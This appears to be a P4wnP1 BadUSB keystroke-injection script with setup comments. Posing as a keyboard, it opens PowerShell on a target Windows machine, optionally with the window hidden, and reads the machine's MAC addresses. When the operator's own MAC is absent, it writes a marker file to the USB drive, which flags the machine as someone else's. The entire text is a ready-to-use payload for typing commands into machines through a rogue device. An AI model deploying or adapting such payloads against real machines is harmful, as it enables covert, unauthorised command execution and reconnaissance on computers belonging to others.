//You need HID Keyboard and USB Mass Storage enabled under USB SETTINGS

layout('gb-2');			//Keyboard layout
hide=false; 			//Set to true to hide the console window on the target
exit=false;				//Set to true to exit the console once finished
typingSpeed(0,0);		//Typing as fast as possible

delay(5000) //Apparently this is neccessary. For some reason without this when lauching from trigger it skips GUI r
press('GUI r');
delay(700);
if (hide) type('powershell -w h -NoP -NonI\n'); else type('powershell\n'); //Hide the console if chosen to do so
delay(2000);
type('$usbPath =((gwmi win32_volume -f "label=""P4wnP1""").Name)\n');	   //Replace "P4wnP1" with your drive name
delay(100);
type('$TestMac = getmac /FO "LIST"\n'); //Getting target machine's MAC addresses in list format
type('$Boolean = "Physical Address: 02-G9-F5-06-CQ-4P" -In $TestMac\n'); //Replace "02-G9-F5-06-CQ-4P" with your MAC address
type('if ($False -eq $Boolean) {echo $null >> $usbPath\\OPFOR} \n'); //If your MAC address is not found on target create empty file OPFOR on USB partition
if (exit) { type('exit\n'); } //Exit the console if chosen to do so
